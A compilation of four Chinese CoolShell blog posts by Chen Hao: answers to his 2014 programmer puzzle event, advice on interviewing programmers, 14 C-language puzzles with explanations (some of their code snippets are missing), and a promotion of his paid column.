（全文完）# 谜题的答案和活动的心得体会作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我于2014年8月3日周六的上午在微博、twitter、CoolShell上发布了一个和程序员有关的解谜题的活动——【活动】解谜题送礼物。我使用了二级域名fun.coolshell.cn做为这次活动的页面。截止这篇文章发布的时候，fun.coolshell.cn的访问量UV大约有4万左右，通关人数大约有200人，但因为在活动的第二天网上就出了一些答题攻略，通过分析，实际靠自己能力通过的人数在130人左右。通过率大约不到4‰的样子。在这里我把整个谜题和做这个活动的东西写一下，算是给自己的一个总结。#### 谜题的答案和花絮fun.coolshell.cn上一共有十道谜题， **要设计这些东西还真是费尽脑汁，这让我对那些设计谜题式游戏的人相当敬佩** 。**第0关：** 很多人可能一头雾水，完全不知道这是什么，其实只要Google一下，你会知道这是一个叫BrainFuck的语言。在Coolshell.cn上我也介绍了过——《BT雷人的程序语言》《BT雷人的程序语言（大全）》，要通过这关，你需要把那段程序编译一下。要编译这段程序其实很简单，Google一个在线的编译器就可以了。（关于其它更多的古怪的编程语言请参看这里：）
**第1关：** 这一关也是很简单的，你需要在网页上找到两个数，一个是X，一个是Y，然后求得X和Y的乘积。对于X，你可以观察一下那个数列游戏，对于Y，你可以Google一下就知道了（我在Coolshell的《如何用最有创造力的方式输出42》说过这个事）。**第2关：** 上面显示了一个不一样的键盘，我给了这个键盘的Wikipedia的链接。这个键盘叫Dvorak键，不同于我们的Qwert键。通过这个两个键盘的布局映射，你可以把下面那段读不懂的文字解出来（其实，你还是可以Google，有在线的转换）。把下面那段文字转成Qwert键的，你就会发现这是一段代码，这段代码非常著名，是1987年国际C语言混乱大赛一等奖的一段代码（你可Google “IOCCC 87 unix”）。（关于IOCCC你可以参看Coolshell之前的《6个变态的HelloWorld》、《如何混乱代码》、《如何写出无法维护的代码》这几篇文章）**第3关：** 扫描二维码以后，你会得到一个码表转换，你可以使用Shell的tr命令来转一下下面的话。转完后你就可以读懂了，读懂了你还需要使用rot13来转一下“shell”（Google一下，你会发现也有在线的转换器，另外还有其它的rot）
**第4关** ：这是众多同学被卡在的地方。很多同学吐槽这题太坑了，别忘了这是游戏啊。我问了几个早先通关的同学，他们都说还好了，只要静一下心来多观察一下，你就会找出规律的。这个回文的模式是，一个大写字符和一个数字（顺序不限）把一个小字母套起来。于是，写成正则表达式是：`([A-Z])([0-9])[a-z]\2\1|([0-9])([A-Z])[a-z]\4\3`用shell命令可以很快地找到9个匹配，然后，像“cat”一样，取中间的小写字母组成一个单词。写成Shell命令是：这题主要考的是你的观察能力和正则表达式。**第5关** ：如果你点了一下图片后，你就知道，这个连接http://fun.coolshell.cn/n/2014返回了一个数字，如果你把这个数字放到那个URL中，不断地替换其中的数字，你会得到一个新的数字。于是你就会得到最终的答案。这道题本来我是想让大家写程序的，我原来设置了一共512个序列，但是考虑到服务受不了，所以，我把它降到了128个，这样保证你的程序可以在几秒钟内得到结果，而不会对我的服务器造成压力。但是我还是看到好几个同学人肉地copy+paste+回车刷了100多下，得到了最终答案。
**第6关：** 通过中序和后序遍历还原一棵二叉树，然后再找到其最深的路径，然后得到一个字符串后，把这个字符串做为一个passcode代入那个openssl的命令行中。你就可以解密密文得到下一关的答案。这个题，我本想设计得更隐晦一些，用一个“心脏流血”的图片来暗示openssl，然后用别的东西暗示AES-128-CBC，后来想想算了，主要还是考大家在大学里的二叉树的最基本的算法。并介绍一下openssl的shell命令行加解密的方法。在网上的一些攻略中我看到了大家没有用程序，而是手动地花了一棵树出来。（其实，这设计这道的时候，我本来想设计成随机树，也就每个人看到的答案都不一样，我随机建树并且找最深路径的程序都写好了，但是我最终还是没有这样做，因为这无疑增加我对这个网页游戏的代码复杂度，而我又没有太多的时间，而谜题的各种形式已经够让我花精力的了，你虽然看到了10道题，但是其实我设计了一共有16道题，我反复斟酌，即不想为难大家，又不想太简单和无聊，所以最终release了这十道题）**第7关：** N皇后问题，这个问题也是大学里的题。9皇后一共有352个解，你需要把这352个解代到那个sha1的公式中（需要上一关用于解密的passcode），这样你就会得到一个解。然后这就是通关口令。
第6关和第7关的算法题你要是不会写的话，Google一下，反正我们是“大自然的搬运工”，不是吗？呵呵。第7关这题啊，我看到一个同学用穷举的1-9的排序组合的方式来向服务发请求，从123456789开始，我都看SB了，因为这关的通答案是9开头，我勒了个去！你得对我的服务器发多少次请求啊，才能得到一个200的回复啊。TNND。服了。不过这个同学我最终还是给通过了，没有判定成作弊。**第8关：** Excel的列号编程，这一关写成代码其实并不难的。但我看到网上给的好些答案，大家都是用手算。也OK，这题本身就没有什么难度，但是因为这个26进制是从1开始的，写出来的代码并不非常容易，一些边界条件很容易就break掉了。这题完全考的是编码。把COOLSHELL除以SHELL的数转成字符串。然后就进入最后一关了。然后，我又见到有个同学用了穷举的方式，TNND，其实每道题都有人在用穷举的方式，我勒个去。他从AAA开始穷举，不一会就穷举出正确答案了。尼玛！**第9关：** 一个猪圈和一个共济会的logo，你Google一下，你就知道答案了。这题纯粹就是介绍知识的。不知道大家有没有去wikipedia上了解了一下这个猪圈密码和共济会是怎么一回事吗？这样的密文叫图片密文，还有很多类似的图片密文的。你知道吗？有相应的字库哦。也有在线的生成器哦。（因为我最近在学各种安全的基础知识，所以了解到了这个东西）
**通关：** 于是你就通关了。你会发现你得到了一个helloworld，这个字符串，在我一放出来这个谜题的时候，就有很多人在尝试helloworld就是那段brainfuck的代码的输出。我汗啊。还好我做了一个比较复杂的防作弊检查……总体来说，这些关卡都不难，但是你最少也得用2-3个小时。Top100页面时统计的平均时间是10个半小时。再说一个花絮，自从，8月3日上线后，8月4日在网上就有了相关的解答攻略，还是在V2EX上，于是出现了好些只花了几分钟就做完了的人。不过好在事先我就预料到了这个事，事先预备好了“反作弊分析”的脚本，细节不想说太多，反正就是说，我会记录你答案的整个过程和行为，以此来确保TOP100中的人基本都是用自己能力答的，当然，可能会有漏判，但至少也是写过代码的。#### 活动心得因为是第一次做活动，所以有很多感想，下面写下一些做这个活动的心得，供大家参考：**1）要做好一个这样的解题游戏并不简单** 。* **关卡设计：** 最花力气的地方就是设计每个关卡，我不能设计得太过隐晦，也不能设计得太过明显。最好是要符合参与者的能力，但又要高于平均以上水平的能力，最好在90%以上。这样会让大家有挑战感，但是又不会有挫败感。这个度相当难把握。总体而言，本次设计的谜题中还有很多可以改进的地方。但这毕竟是我的第一次，也算是我用其来感受一下应该怎么设计游戏。
* **游戏黏性：** 除了设计谜题，还需要针对用户可能会答错的地方来给用户一些提示，原因也是为了不让用户有挫败感，虽然用户没有答对，但是需要用这些页面来鼓励用户You made some progress，这个很重要。这会让用户对游戏更有粘性，并且更愿意有更多的投入。找到这些地方也不是一件容易的事，因为做为游戏的设计者来说，很难从一个不知到答案的角度去思考。所以需要试玩，在fun.coolshell.cn正式release之前，我找了几个人比较聪明的人来试玩了一下，对这个游戏的帮助很大。* **游戏管理：** 这样的一个在线游戏自然会出一些作弊者，为了游戏的公平性，你需要剔除这些作弊者。所以，我设计了一些比较简单的记录用户所有过程的监测的算法。通过cookie和后台的http log来一同分析。这个部分也比较地花时间。我上周六的时候写这些代码写到了凌晨4点，导致脑子不清楚，出了些bug，导致在大家游戏过程中重置cookie等伤害用户体验的事件。所以说啊，不能赶啊，也不能加班啊。**2）关于怎么做一个活动的感想。*** **这次活动的背景** 。首先，想做这个活动的起因是这样的。我一个朋友在微博上做活动——“转发微博或@几个人怎么怎么滴就有机获得什么什么的”， **我在这里把这种活动简称为“转就送”活动** 。于是遭到了水军的刷奖品，导致他根本分不清楚哪些是正常人，哪些不是，因为新浪微博上有大量的这要瓣机器人，所以他这次活动最后失败了。我说，你得加点难度啊，要加点智商啊。 **而且，我看过太多的活动都是这样的，而且很多公司的活动也是这样的，我觉得太low了** 。于是，我就萌生了自己尝试一下的念头。
* **我对做活动的理解** 。我一直觉得网上那些诸如“转就送”或是“抽奖”这样的活动都比较SB，这些人根本就不知道怎么做活动。这样做活动不需要智商，简单粗暴，效果一点也不好，活动做完了，人就走了，人们马上就忘了。我以为做活动的精髓是这样的：* **真正的价值** 。其实，好的活动并不只是物品的价格，而是参与这个过程的感觉和体会。如果你让人觉得这是碰运气的，那么这个活动除了用物品价格来吸引人，也就没别的什么了。 **如果这个活动的参与过程是让人有成就感的，要有成就感那么就需要有一定难度的挑战，而且这种挑战也是让众人认可和佩服的，那么这个奖品的价格再小，价值也会很大** 。比如：Olympic Game，World Cup之流的，世界顶尖，四年一次，来之不易。这才是活动的价值。本次的fun.coolshell.cn上的活动，我希望让大家在做题的过程中学到一些东西，另外也希望做出来的人有一种成就感。* **让人有回味** 。那些简单的“转就送”式的活动不会让人产生任何的回味，只会让人产生很大的反感。就像那些“让你转发，不转就死全家”的东西，相当的让人反感。真正的回味是人们对活动参与过程的讨论和交互。在fun.coolshell.cn上线后，我就看到好几个社区在讨论这些谜题，这就是所谓的回味。 **只有人们对过程的回味，对参与的回味，才会让这个活动真正的成功** 。
* **暴露活动过程** 。有挑战的活动，一定要有一个Who’s Who的东西，而且是随时动态更新的可以让大家查询的，这样才会从另一个侧面激发大家的热情。因为fun.coolshell.cn一开始说了只给前十个人送东西，结果在过程中，我发现了就半天时间就差不多满了，那时我在想，如果没有奖品了，剩下的人还会不会玩了？于是我飞快地开发了一个TOP100的排行榜，让大家可以看得到这个过程，虽然前十以后就没有奖品了，但是，能上这TOP100也不错。于是乎，在没有奖品情况下，依然在激发着大家的解题热情。 **有竞争总是一件有意思的事情，因为成就感总是来自竞争** 。（注：为什么top100中会有“xxxxxx”的用户，因为一开始我用的是用户提交的name，但是后来有人告诉我，这个名字可能是真名，所以，我就改成了weibo或twitter的ID，而xxxxx则是没有留下微博或twitter的）最后吐个槽， **我真的觉得那些“纯靠运气的活动”相当的SB，我看到好些公司的运营部门招了多少个所谓的高学历和高能力的人，结果干出来的运营活动的水平，其实，也就是个有小学文化水平的人就可以做的了** 。那些“转就送式的”、“抽奖式的”的活动，是个人都会干，根本不需要高学历的人。
#### 其它1） **本次活动中，有一个隐藏关卡，还没有人找出来** 。要能达到隐藏关卡，需要完成所有的题目。2） **活动的通关页是HelloWorld，这意味着——这仅仅是个开始** 。最后感谢大家为这个活动付出的时间！（全文完）# 我是怎么招聘程序员的作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!面试很早以前就想写一篇和面试相关的文章了，今天在网络上看到一篇关于如何去面试程序员的英文文章，发现其中有很多和我共鸣的东西，所以仿照其标题通过自己的经历写下了这篇文章。工作这么多年来，即被面试过，也面试过他人，对于程序员的面试，经历过很不错的面试，很专业的面试，也经历过一些BT和令人不爽的面试，我个人觉得一个好的面试，面试官是很重要的，所以，本文想从“面试官”的角度来阐述一下。于是，有了下面这样一篇的文章，希望本文对你的职场经历有用，特别是那些正在招聘和面试程序员的朋友，我觉得这篇文章会对大家有很多启示。此外，做为被面试的人，你可以看看本站的《别的程序员是怎么读你的简历的》《程序员需要具备的基本技能》《优秀程序员的十个习惯》其它一些和程序员相关的文章。
对于招聘方来说，在招聘程序员的时候，我估计面试应聘者时，最主要想知道的是下面三件事：1. 这个程序员的是否够聪明？   2. 这个程序员能否把事情搞定？   3. 这个程序员能和我的团队在一起工作吗？我相信，这是所有团队经理招人要考虑的三个问题，所有的问题也基本上围绕着这三个问题。有些时候，你也许觉得程序员的技术技能可以同时解决这三个问题，一个技术能力优秀的人必然是一个聪明的，可以搞定事情的人，当然也就能和团队一起工作了。是的，感觉看起来是这个样子，但其实并不是这样的。有些人的确很聪明，但却不能处理好工作上的事情，这样人应该是你的朋友，你的顾问，但不应该是你的雇员。有的人为人很不错，和团队所有人都合得来，但并不是很聪明，但工作很刻苦很努力，这样的人可以成为你的下属，比如某个下属骨干的助手，或是整个团队的助手。如果某个人不能和团队一起工作，无论其有多聪明，解决问题的能力有多强，你都不应该和他在一起工作。人个认为，团队的和谐是一切事情的前提。对于传统的面试招聘过程，基本上来说都是下面这样的样子的：1. 阅读应聘者的简历，让应聘者做个自我介绍。   2. 问一些比较难的非常细节的技术问题，以一问一答的形式。   3. 给面试者一些和几个编程难题。（比如某些怪异的算法题）
我个人觉得这种面试方法很可笑，也很糟糕，尤其是后面两点。通常来说，这样的面试只会让你面试到一些“书呆子”或是一些“技术痴迷者”，下面让我来一条一条地剖析一下这几条的弊端。1. 你很难从一个人的简历或是自我介绍上了解一个人。因为这些都是当事人自己写的，或是自己阐述的。所以，这并不是很准确的，通过简历，你只能知道很简单的事情，这对于是否能招入团是远远不够的。而在面试的开始，让应聘者做自我介绍，只会让面试者以很正式的态度来面对整个面试。一但面试过程很正式，很严肃，就会让人很拘禁，其实，这并不是我们想要的，我要的是 **应聘者真实和自然的表现，从而才能了解到最真实的东西** 。   2. 问几个技术细节的问题。比如：我个人经历过的——“ps的-a参数是什么意思？”，“vi中删除换行符的命令是什么？”，“C++的关键字explict,mutable是用来干什么？”等等，等等。以前做为一个应聘者来说，我非常讨厌这样的问题，因为这样的问题查一下手册就知道。难道他要招的是一个字典手册？不是一个人？对于这方面， **重要的不是知识，重要的是其查找知识的能力** 。   3. 给应聘者一个或几个很难的算法题，给上十几分钟，然后让面试者把伪代码或是代码写下来。这样的做法是相当可笑的，不能讨论不能查资料，让人在一种压力状态下作答，这根本就不是实际工作中的状态，而我们的面试也就成了一种刁难（我最变态的经历是，当我把写在两页纸上的代码上交上去后，面试官把其交给旁边程序员输出电脑做校验，结果程序员说，编译出错。于是，面试官说，“很遗憾，可能你写的程序还不多”，相当可笑）。对于这点来说， **重要的不是那个解题的答案，而是解题的思路和方法** 。
我以前经历过很多的面试，当技术人员来和我做面试的时候，我发现，“技术人员的思维”对于某些人来说根本分不清面试和考试， **在潜意识里，他们在很多时候不是在面试这个人，而是在刁难这个人并以此展示自己的技能** 。我个人认为我是一个好的程序员，但我可以告诉你我无法通过那样的面试，因为那样的面试是为他们自己准备的，而不是为应聘者准备的。那么，我又是怎样去面试的呢？**一、确认简历。** 首先，阅读一下别人的简历是需要的，从简历上，工作经历，项目经历，技术技能这三个事情是你需要了解的。一般来说，你可以先通过电话确定一下他的工作经历，项目经历和技术技能，然后，如果他和你需要的人条件相符的话，可以叫到公司做面对面的面试。千万不要把别人叫来，你又说你的经历和我们的工作有差距之类的话。（我有过一次面试经历，公司我不说了，反正是那个号称需要有良好沟通的公司，面试了我9次左右，从一般的程序员，PM，经理，到总经理，而最后一次直接告诉我，我以前的经历和他们的要求差距很大。我不禁要问了，前面若干次的面试他们都在干什么呢？）**二、面试开场。** 其次，把人邀请来公司面试，应聘者到了公司来面试，有一点很重要，那就是你一定要让整个面试过程变得很随意，很放松，就像普通的聊天和一般朋友间的交流一样。这样应聘者才会放松并拿出真实的样子来和你谈话和聊天，你才能在很短的时间内了解得更多。让应聘者放下心理负担，让其表现得自然一些，这是招聘方的责任。千万不要说，别人太紧张发挥的不好，有时候，招聘方得想想自己的问题。
面试开场的时候，千万不要让应聘者介绍自己，因为，应聘者早就给你发过简历了，而你也给其打过电话了。另外，应聘者对这个面试惯例通常都会准备得非常不错的，另一方面，这会让整个面试过程太正式太严肃了。所以，不妨问问应聘者是怎么过来的？最近怎么样？还可以和应聘者谈一个大众话题，比如喜欢什么体育，音乐，电影，社会热点什么的，自己也别板着个脸，说说笑笑，试图让大家都放松下来。另外，通过这些闲聊，你可以知道他/她的与人交往能力和一些性格。另外，不要让桌子放在你和应聘者之间，把环境搞得随意一些。**三、多让应聘者说说他的经历** 。接下来，如果你要觉得这个应聘者是否是一个可以解决问题，是一个可以把事情搞定的人，不用问他/她会做什么，直接问问其做过什么？干过什么事？对于一个好的程序员来说，很难想像其没有相关的实践，就算你是在大学里，你也应该做过什么。如果你有解决问题的能力，那么，很显然，今天你应该解决了很多问题，也搞定了很多事情，听听应聘者说一说他的那些事。（不要使用一问一答这种方式，应该让应聘者多说，而多听，多想）在他讲他的项目的时候，通常来说你要注意下面几点：* **沟通表达能力** 。应聘者能不能把一个事情讲清楚。如果这个人聪明的话，他就可以用最简单的语言把一个复杂的事情讲清楚。而且，这是一个好的程序员最基本的能力。而且，你可以在应聘者一边描述其经历的时候，你可以和应聘者有一些的良好的来来回回的交谈，这样就可以知道，他的沟通能力和沟通方式，从而了解他的性格，。   * **角色和位置** 。也许他参与了一个很大的项目，但只是做了一个很简单的模块。所以，了解其在项目中的担任的角色和位置是非常必要的。当应聘者说到“我们”或者“大家”之类的词汇时，一定要向下细化和明确。   * **做出的贡献和解决了什么的问题** 。这个很重要，通过了解这个，你可以知道面试者是否聪明，是否有能力解决问题，是否有好的技术底子。   * **演示** 。如果可能，你可以让应聘者展示一些其写过的代码，做过的设计，或是直接给你看看他写的程序的演示。（从设计上，代码的风格，重用性，维护性上你可以了解很多很多）   * **基础知识** 。了解该项目中应聘者使用的技术的一些基础知识，比如，通过整个过程，你可以问一些网络，语言，面象对象，系统的一些基础知识。基础知识是非常重要的，这直接关系到了他的能力。   * **流程和工具** 。了解应聘者所熟悉的项目的流程（银弹，瀑布，敏捷，……），还有流程中的一些工件（如：需求文档，设计文档，测试方档等），以及在开发过程中使用的工具（内存测试，代码检查，BUG报告，版本维护，开发调试……）（关于程序员的基本技能，你可以参考——《程序员需要具备的基本技能》）
有人会说，应聘者的经历可以被他自己编出来的，他可以把一些不是他做的事说成是他做的。是的，的确是有这种可能。不过，不要忘了，一个谎言背后需要用更多的谎言来圆谎的，所以，你不必担心这个问题，只要你在应聘者的描述过程中逐步求精，细化问题，你会知道应聘者是否是在编故事的。千万记住下面几点：* 谈话风格要随意和自然，不要正式。   * 在了解应聘者以前做过的事的时候，不要太投入了。因为招聘方也是技术人员，所以有时候，招聘者自己会因为应聘者所做的项目中的技术太过迷人而被吸引了。   * 要注意引导应聘人。相信我，应聘的程序员十个人有八个人讲不清楚以前做的是什么。因为他们直接跳过了项目背景和要解决什么样的问题，而直接进入具体实现。   * 不要一问一答，应该多让应聘者说，这样才能多全方位了解一个人。   * 了解一个人的过去，了解一个人做过的事情，比其会做什么更重要。   * 了解一个人的性格，想法，思维和行为，比了解其技术技能更重要。   * 沟通能力，表达能力，语言组织能力，理解能力，等方面的能力，关系到了是否能和别人一起工作。   * 基础知识比知识的点滴要重要得多。你可能不知道其个C++的关键字，但你应该要知道C++的继承和多态。   * 技术技能固然很重要，但比其更重要的是这个人获取知识的能力，学习能力是在计算机这样变化飞快行业中必需具备的。   * 是否可以进行培养，比掌握的技能更重要。
**四、实际参与？？** 这一步可能是很不好实施的。因为，这需要一些应聘者付出一定的时间，如果是毕业生，那没有问题，先让他来实习一段时间。但如果别人有工作，就不好了。也许你会说，这就是试用期的用处了。不过，我个人觉得，你得要尊重应聘者，人家把那边的工作辞了，来你这边工作，三个月试用期间，如果没有什么原则上的问题，你作为一个招聘方又反悔了，这样做很是相当的不好。如果发现这样的事，只能是招聘者自己的问题。在面试过程中，一些招聘者会让应聘者们一起做个游戏，或是搞个辩论比赛，或是现场组个团队干个简单的事情，有的甚至让应聘者请一天假到自己的公司里来和自己的团队一同工作一天，并要完成某个事情（甚至给其设置上deadline），并通过这些来考量应聘者的实际参与能力。是的，如果没有一起工作过，没有一些实际的事情发生，单靠几个小时的面试很难了解一个人的。设置上这些面试的环节，在最短的时间内来了解应聘者的一切，对于招聘方来说无可厚非。而且有的时候也能得到不错的效果。在这里，我只提一点，有时候这样的周期拉得很长，让应聘者付出了很多，反尔会让应聘者产生反感和厌烦情绪，从某种意义上来说，这实在是对应聘者的不尊重。
对于这一点，我一直持疑问的态度，所以，我在其后打了两个问号。老实说，对于实际参与这一环节，我个人的意见是适可而止，因为时间太短了，无论你怎么做你都无法了解完整。即然无法了解完整，那就获取你最需要的吧，就是本文开头的那三个问题，以及上面所述的“第三点”（了解应聘者的以往经历）。也许这个文章中有一些你不同意的观点，没问题，欢迎批评，如果你有更好的做法，我也想听听，不妨在这里留个言，如果不想留也可以email给我。（全文完）# C语言的谜题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这几天，本站推出了几篇关于C语言的很多文章如下所示：* **语言的歧义** [酷壳链接] [CSDN链接]   * **谁说C语言很简单？** [酷壳链接] [CSDN链接]   * **6个变态的C语言Hello World程序** [酷壳链接] [CSDN链接]   * **如何加密/弄乱C源代码** [酷壳链接] [CSDN链接]   * **C语言的谜题** [酷壳链接] [CSDN链接]我们可以看到很多C语言相关的一些东西。比如《语言的歧义》主要告诉了大家C语言中你意想不到的错误以及一些歧义上的东西。而《谁说C语言很简单》则通过一些看似你从来不可能写出的代码来告诉大家C语言并不是一件容易事情。《6个变态的hello world》和《如何弄乱C的源代码》则以一种极端的方式告诉大家，不要以为咱们自己写不出混乱的代码，每个程序员其实都有把代码搞得一团乱的潜质。通过这些文章，相信你对编程或是你觉得很简单的C语言有了一些了解。是的，很不容易吧，以前是不是低估了编程和C语言？今天是否我们又在低估C++和Java呢？
本篇文章《C语言的谜题》展示了14个C语言的迷题以及答案，代码应该是足够清楚的，而且我也相信有相当的一些例子可能是我们日常工作可能会见得到的。通过这些迷题，希望你能更了解C语言。如果你不看答案，不知道是否有把握回答各个谜题？让我们来试试。**1、下面的程序并不见得会输出 hello-std-out，你知道为什么吗？****参考答案** ：stdout和stderr是不是同设备描述符。stdout是块设备，stderr则不是。对于块设备，只有当下面几种情况下才会被输入，1）遇到回车，2）缓冲区满，3）flush被调用。而stderr则不会。**2、下面的程序看起来是正常的，使用了一个逗号表达式来做初始化。** 可惜这段程序是有问题的。你知道为什么呢？**参考答案** ：这个程序会得到编译出错（语法出错），逗号表达式是没错，可是在初始化和变量声明时，逗号并不是逗号表达式的意义。这点要区分，要修改上面这个程序，你需要加上括号： int a = (1,2);**3、下面的程序会有什么样的输出呢？****参考答案** ：程序会输出4321，你知道为什么吗？要知道为什么，你需要知道printf的返回值是什么。printf返回值是输出的字符个数。
**4、下面的程序会输出什么？****参考答案** ：   该项程序输出如下所示，   0   12   1095237632   原因是：浮点数是4个字节，12.5f 转成二进制是：01000001010010000000000000000000，十六进制是：0x41480000，十进制是：1095237632。所以，第二和第三个输出相信大家也知道是为什么了。而对于第一个，为什么会输出0，我们需要了解一下float和double的内存布局，如下：* **float** : 1位符号位(s)、8位指数(e)，23位尾数(m,共32位)    * **double** : 1位符号位(s)、11位指数(e)，52位尾数(m,共64位)然后，我们还需要了解一下printf由于类型不匹配，所以，会把float直接转成double，注意，12.5的float和double的内存二进制完全不一样。别忘了在x86芯片下使用是的反字节序，高位字节和低位字位要反过来。所以：* **float版** ：0x41480000 (在内存中是：00 00 48 41)   * **double版** ：0x4029000000000000 (在内存中是：00 00 00 00 00 00 29 40)
而我们的%d要求是一个4字节的int，对于double的内存布局，我们可以看到前四个字节是00，所以输出自然是0了。这个示例向我们说明printf并不是类型安全的，这就是为什么C++要引如cout的原因了。**5、下面，我们再来看一个交叉编译的事情，下面的两个文件可以编译通过吗？如果可以通过，结果是什么？**file1.cint arr[80];file2.c**参考答案** ：该程序可以编译通过，但运行时会出错。为什么呢？原因是，在另一个文件中用 extern int *arr来外部声明一个数组并不能得到实际的期望值，因为他们的类型并不匹配。所以导致指针实际并没有指向那个数组。注意：一个指向数组的指针，并不等于一个数组。修改：extern int arr[]。（参考：ISO C语言 6.5.4.2 节）**6、请说出下面的程序输出是多少？并解释为什么？** （注意，该程序并不会输出 “b is 20″）**参考答案** ：该程序在编译时，可能会出现一条warning: unreachable code at beginning of switch statement。我们以为进入switch后，变量b会被初始化，其实并不然，因为switch- case语句会把变量b的初始化直接就跳过了。所以，程序会输出一个随机的内存值。
**7、请问下面的程序会有什么潜在的危险？****参考答案** ：本题很简单了。这个程序的潜在问题是，如果用户输入了超过80个长度的字符，那么就会有数组越界的问题了，你的程序很有可以及会crash了。**8、请问下面的程序输出什么？****参考答案** ：如果你觉得输出分别是，10，4，11，那么你就错了，错在了第三个，第一个是10没有什么问题，第二个是4，也没有什么问题，因为是32位机上一个int有4个字节。但是第三个为什么输出的不是11呢？居然还是10？原因是，sizeof不是一个函数，是一个操作符，其求i++的类型的size，这是一件可以在程序运行前（编译时）完全的事情，所以，sizeof(i++)直接就被4给取代了，在运行时也就不会有了i++这个表达式。**9、请问下面的程序的输出值是什么？**#define SIZEOF(arr) (sizeof(arr)/sizeof(arr[0]))     #define PrintInt(expr) printf("%s:%d\n",#expr,(expr))int i;     for(i=0;i<SIZEOF(pot);i++)     PrintInt(pot[i]);
return 0;     }**参考答案** ：好吧，如果你对于PrintInt这个宏有问题的话，你可以去看一看《语言的歧义》中的第四个示例。不过，本例的问题不在这里，本例的输出会是：1，8，64，1000，其实很简单了，以C/C++中，以0开头的数字都是八进制的。**10、请问下面的程序输出是什么？（绝对不是10）****参考答案** ：本题输出的是100。为什么呢？问题就出在 y = y/*p;上了，我们本来想的是 y / (*p) ，然而，我们没有加入空格和括号，结果y/*p中的 /*被解释成了注释的开始。于是，这也是整个恶梦的开始。**11、下面的输出是什么？**printf("%d\n",i);     return 0;     }**参考答案** ：本题并不简单的是考前缀++或反缀++，本题主要考的是&&和||的短路求值的问题。所为短路求值：对于（条件1 && 条件2），如果“条件1”是false，那“条件2”的表达式会被忽略了。对于（条件1 || 条件2），如果“条件1”为true，而“条件2”的表达式则被忽略了。所以，我相信你会知道本题的答案是什么了。**12、下面的C程序是合法的吗？如果是，那么输出是什么？**
printf(&a["Ya!Hello! how is this? %s\n"], &b["junk/super"]);printf(&a["WHAT%c%c%c  %c%c  %c !\n"], 1["this"],     2["beauty"],0["tool"],0["is"],3["sensitive"],4["CCCCCC"]);return 0;     }**参考答案** ：   本例是合法的，输出如下：> Hello! how is this? super   >  That is C !本例主要展示了一种另类的用法。下面的两种用法是相同的：> “hello”[2]   >  2[“hello”]如果你知道：a[i] 其实就是 *(a+i)也就是 *(i+a)，所以如果写成 i[a] 应该也不难理解了。**13、请问下面的程序输出什么？** （假设：输入 Hello, World）**参考答案** ：本例的输出是“Hello, Wo”，scanf中的”%[^r]”是从中作梗的东西。意思是遇到字符r就结束了。**14、下面的程序试图使用“位操作”来完成“乘5”的操作，不过这个程序中有个BUG，你知道是什么吗？**
**参考答案** ：本题的问题在于函数FiveTimes中的表达式“t = a<<2 + a;”，对于a<<2这个位操作，优先级要比加法要低，所以这个表达式就成了“t = a << (2+a)”，于是我们就得不到我们想要的值。该程序修正如下：（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 程序员练级攻略（2018) 与我的专栏作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn写极客时间8个月了，我的专栏现在有一定的积累了，今天想自己推荐一下。因为最新的系列《程序员练级攻略（2018）版》正在连载中，而且文章积累量到了我也有比较足的自信向大家推荐我的这个专栏了。推荐就从最新的这一系统的文章开始。2011年，我在 CoolShell 上发表了 《程序员技术练级攻略》一文，得到了很多人的好评（转载的不算，在我的网站上都有近1000W的访问量了）。并且陆续收到了一些人的反馈，说跟着这篇文章找到了不错的工作。几年过去，也收到了好些邮件和私信，希望我把这篇文章更新一下，因为他们觉得有点落伍了。是的， **老实说，抛开这几年技术的更新迭代不说，那篇文章写得也不算特别系统，同时标准也有点低，当时是给一个想要入门的朋友写的，所以，非常有必要从头更新一下《程序员练级攻略》这一主题** 。
目前，我在我极客时间的专栏上更新《程序员练级攻略（2018版）》。升级版的《程序员练级攻略》会比Coolshell上的内容更多，也更专业。这篇文章有【入门篇】、【修养篇】、【专业基础篇】、【软件设计篇】、【高手成长篇】五大篇章，它们会帮助你从零开始，一步步地，系统地，从陌生到熟悉，到理解掌握，从编码到设计再到架构，从码农到程序员再到工程师再到架构师的一步一步进阶，完成从普通到精通到卓越的完美转身……这篇文章是我写得最累也是最痛苦的文章，原因如下：* **学习路径的梳理** 。这是一份计算编程相关知识地图，也是一份成长和学习路径。所以有太多的推敲了，知识的路径，体，地图……这让我费了很多工夫，感觉像在编写一本教材一样，即不能太高大上，也不能误人子弟。   * **新旧知识的取舍。** 另外，因为我的成长经历中很多技术都成了过去时，所以对于新时代的程序员应该学习新的技术，然后，很多基础技术在今天依然管用，所以，在这点上，哪些要那些不要，也花了我很多的工夫。   * **文章书籍的推荐** 。为了推荐最好的学习资料和资源，老实说，我几乎翻遍了整个互联网，进行了大量的阅读和比较。这个过程让我也受益非浅。一开始，这篇文章的大小居然在500K左右，太多的信息就是没有信息，所以在信息的筛选上我花费了很多的工夫，删掉了60%的内容。但是，依然很宠大。
**总之，你一定会被这篇文章的内容所吓到的，是的，我就是故意这样做的，因为，这本来就没有什么捷径，也不可能速成，很多知识都是硬骨头，你只能一口一口的啃，我故意这样做就是为了让你不要有“速成”的幻想，也可以轻而一举的吓退那些不想用功不想努力的人** 。但是，我们也要知道《易经》有云：“ **取法其上，得乎其中，取法其中，得乎其下，取法其下，法不得也** ”。所以，我这里会给你立个比较高标准，你要努力达到，相信我，就算是达不到，也会比你一开始期望的要高很多……下面是这份练级攻略的目录，目前只在极客时间上发布，你需要付费阅读（在本文最后有相关的二维码）。那么，除程序员练级攻略外，我还写了哪些内容？下面是迄今为止我所有的文章的目录。你可以在下面看一下相关的目录。这也算是我开收费专栏来8个月给大家的一份答卷吧。我也没有想到，我居然写了这么多的文章，而且对很多人都很有用。首先是个人成长和经验之谈的东西，在这里的文章还没有完全更新完，未来要更新什么我也不清楚，但是可以呈现出来的内容和方向如下所示，供你参考。对于个人成长中的内容，都是我多年来的心得和体会，从读者的反馈来看是非常不错的，你一定要要阅读的。
